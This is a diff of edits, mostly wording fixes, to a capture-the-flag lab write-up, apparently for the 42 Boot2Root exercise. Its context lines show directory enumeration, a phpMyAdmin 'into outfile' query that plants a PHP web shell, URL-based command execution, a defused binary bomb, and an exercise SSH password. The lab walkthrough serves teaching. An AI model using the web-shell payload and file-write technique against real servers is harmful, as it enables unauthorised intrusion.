@@ -1,3 +1,5 @@
+# Writeup 1
+
 `$ ifconfig`
 
 ![image](https://github.com/user-attachments/assets/ca4fd3bb-b9af-426c-8050-4502cfd94372)
@@ -123,7 +125,7 @@ END_TIME: Mon Aug 12 04:35:45 2024
 DOWNLOADED: 4612 - FOUND: 2
 ```
 
-With the **non-recursive** option dirb will just list the first level directories of the main URL that was specified in the command. We don't have the permission to access 2 of these directories as indicated by the **403 status code**. But we 3 new directories ready for inspection:
+With the **non-recursive** option dirb will just list the first level directories of the main URL that was specified in the command. We don't have the permission to access 2 of these directories as indicated by the **403 status code**. But we have these 3 directories ready for inspection:
 - /forum
 - /phpmyadmin
 - /webmail
@@ -251,7 +253,9 @@ phpMyAdmin
 
 `ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0516d551c28`
 
-So, we were able to get the password hash for the admin. But I was unable to crack the hash. The old friend `john` or `crackstation` couldn't help. It would have been good to know more about the kind of hashing alghoritm they used. Let's see if we can figure that out.
+So, we were able to get the password hash for the admin. But I was unable to crack the hash. The old friends `john` or `crackstation` couldn't help. It would have been useful if we knew more about the type of hashing algorithm used.
+
+Let's see if we can figure it out.
 
 We see that the forum is powered by [mylittleforum](https://mylittleforum.net/) which is a simple PHP and MySQL based internet forum that displays the messages in classical threaded view (tree structure). It is Open Source licensed under the GNU General Public License.
 
@@ -275,6 +279,7 @@ function generate_pw_hash($pw) {
 ```
 
 The hash is composed of a salted SHA-1 hash. In the light of this information I was still unable to crack the admin's password hash. So I decided to just generate my own hash. Here is a simple script:
+
 ```
 <?php
 function generate_pw_hash($pw) {
@@ -315,7 +320,7 @@ Very very sad.
 
  [system](https://www.php.net/manual/en/function.system.php) — Execute an external program and display the output
  
-[$_GET](https://www.php.net/manual/en/reserved.variables.get.php) An associative array of variables passed to the current script via the URL parameters (aka. query string).
+[$_GET](https://www.php.net/manual/en/reserved.variables.get.php) — An associative array of variables passed to the current script via the URL parameters (aka. query string).
 
  Our goal will be to upload this to the victim site and execute something along the lines of `example.com/upload/test.php?c=whoami`
 
@@ -323,10 +328,9 @@ Very very sad.
 
 The [default document root](https://askubuntu.com/questions/683953/where-is-apache-web-root-directory-on-ubuntu) for Apache is **/var/www/** (before Ubuntu 14.04) or /var/www/html/ (Ubuntu 14.04 and later)
 
-We can use the into outfile command write the output of the query into a file at the specified location on the server. Neat [tutorial](https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/) that I will be following.
+We can use the `into outfile` command to write the output of the query into a file at the specified location on the server. Neat [tutorial](https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/) that I will be following.
 
-Going back to our dirb results, I one by one tried every subdirectory that returned status code 200.
-`forum/templates_c` turned out to be the only one where we have write right.
+Going back to our dirb results, I one by one tried every subdirectory that returned status code 200. `forum/templates_c` turned out to be the only one where we have write right.
 
 `select 1, '<?php system($_GET["c"]); ?>' into outfile '/var/www/forum/templates_c/cmd.php'`
 
@@ -349,6 +353,8 @@ _The web server has to be run under a specific user._
 _If it were run under root, then all the files would have to be accessible by root and the user would need to be root to access the files. With root being the owner, a compromised web server would have access to your entire system._
 
 _By default the configuration of the owner is www-data in the Ubuntu configuration of Apache2._
+
+Supplying all these commands via URL parameter is tedious and it would be nice to get reverse shell with Netcat at this point but it doesn't seem to work. I will keep supplying the commands via the URL for now and will come back to it later.
 
 `https://192.168.56.103/forum/templates_c/cmd.php?c=find%20/%20-user%20www-data%202%3E/dev/null`
 
@@ -764,7 +770,7 @@ int __cdecl phase_5(int a1)
   return result;
 }
 ```
-Hey, "giants" makes another appearance! The result should be equal to giants but a set operations is performed on the string we pass which messes it up.
+Hey, "giants" makes another appearance! The result should be equal to giants but a set of operations is performed on the string we pass and mess it up.
 
 ![image](https://github.com/user-attachments/assets/f9746b91-11b7-461e-94b5-d3a368c21388)
 
@@ -868,7 +874,7 @@ Now let's see what these nodes are supposed to be.
 ![image](https://github.com/user-attachments/assets/ee06ca25-2030-4529-8c89-5aefd316b3c8)
 
 They are double word values so we will interpert them as 16 bit integers
-so,
+thus,
 
 `node6=1B0=432`
 
@@ -896,7 +902,7 @@ We have defused the bomb! We can login as thor with ssh now.
 
 Password: `Publicspeakingisveryeasy.126241207201b2149opekmq426315`
 
-Apparently this does not work. I might be overlooking something or there might be an error in the exercise, whatever is the case the only accepted password is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+Apparently this does not work. I might be overlooking something or there might be an error in the exercise. In any case, the only accepted password is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
 This issue was discussed in the 42 Network [forums](https://stackoverflowteams.com/c/42network/questions/664) before.
 
@@ -971,7 +977,7 @@ A cute little turtle draws stuff for us.
 
 `rt()` to turn right`
 
-”turtle” comes packed with the standard Python package and need not be installed externally. With the elp of a quick [tutorial](https://www.geeksforgeeks.org/turtle-programming-python/) we can write a python program that will read the given file and draw the message for us. 
+”turtle” comes packed with the standard Python package and need not be installed externally. With the help of a quick [tutorial](https://www.geeksforgeeks.org/turtle-programming-python/) we can write a python program that will read the given file and draw the message for us. 
 
 ```
 import turtle
@@ -1008,7 +1014,7 @@ for line in file:
 turtle.done()
 ```
 
-Make sure to not name this program [turtle.py](https://python-forum.io/thread-149.html).
+Make sure to not name this program [turtle.py](https://python-forum.io/thread-149.html) and waste your time trying to figure out what's wrong like me.
 
 ![image](https://github.com/user-attachments/assets/eb97128d-b6d9-405c-a9c3-ee36b3dd3fff)
 
@@ -1016,15 +1022,19 @@ Make sure to not name this program [turtle.py](https://python-forum.io/thread-14
 
 ![image](https://github.com/user-attachments/assets/283f4ff0-5eb3-47b7-8827-def21b03c33d)
 
+ **Can you digest the message?** Is a reference to the MD5 (message-digest algorithm) hashing alghoritm.
+ 
 `$ md5sum slash`
 
 `646da671ca01bb5d84dbb5fb2238dc8e`
 
 ![image](https://github.com/user-attachments/assets/45d1b4d8-c5f0-4216-9525-78b2a14ca61b)
 
-We have a directory called mail and an exe called exploit_me. exploit me belongs to root and has SUID bit set.
+We have a directory called mail and an exe called exploit_me. exploit me belongs to root and has SUID bit set. 
 
 ![image](https://github.com/user-attachments/assets/9d8f300c-850b-4cf0-8c8e-dafe172337e7)
+
+The files in the mail directory are all empty.
 
 ![image](https://github.com/user-attachments/assets/0bf5f585-2a3a-4ac3-927f-76df823296ea)
 
